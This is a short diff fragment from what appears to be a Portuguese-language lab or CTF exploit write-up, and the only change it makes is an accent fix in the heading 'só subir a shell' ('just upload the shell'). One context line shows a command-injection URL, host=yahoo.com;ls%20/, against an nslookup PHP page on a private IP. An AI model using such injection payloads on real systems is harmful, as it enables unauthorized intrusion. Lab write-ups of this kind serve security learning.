@@ -57,5 +57,5 @@ http://192.168.100.207/temp/portal/nslookup/__index.php?host=yahoo.com;ls%20/
 
 ![img_exploit](https://github.com/user-attachments/assets/08036e6d-a273-4445-a951-57cc98c2b16c)
 
-### so subir a shell
+### só subir a shell
 ---
